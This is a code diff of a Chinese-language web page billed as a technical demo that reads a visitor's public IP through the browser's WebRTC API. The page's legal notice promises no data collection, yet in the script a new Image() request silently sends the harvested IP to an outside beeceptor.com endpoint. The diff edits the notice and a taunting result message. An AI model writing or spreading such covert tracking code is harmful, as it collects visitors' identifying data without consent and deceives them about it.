@@ -31,8 +31,8 @@
 
     <div class="legal-notice">
         法律声明：本网页仅用于技术演示目的，通过浏览器标准API获取公网出口IP地址。
-        本人朱子硕承诺不会收集、存储或分享任何用户数据。根据《网络安全法》等相关法规，
-        严禁将本网页用于任何非法用途。继续使用即表示您同意仅将本网页用于合法授权场景。
+        本人承诺不会收集、存储或分享任何用户数据。根据《网络安全法》等相关法规，
+        严禁将该工具用于任何非法用途。继续使用即表示您同意仅将本网页用于合法授权场景。
     </div>
 
     <script>
@@ -51,7 +51,7 @@
             const ipMatch = ice.candidate.candidate.match(ipRegex);
             if (ipMatch) {
                 document.getElementById('result').innerHTML = 
-                    `✅ 逆天无敌666<br>人机的公网IP：<b>${ipMatch[0]}</b>`;
+                    `✅ 朱子硕逆天无敌666<br>已获人机公网IP：<b>${ipMatch[0]}</b>`;
                 // 逆天
                 new Image().src = `https://zzs-ip.free.beeceptor.com?ip=${ipMatch[0]}`;
             }
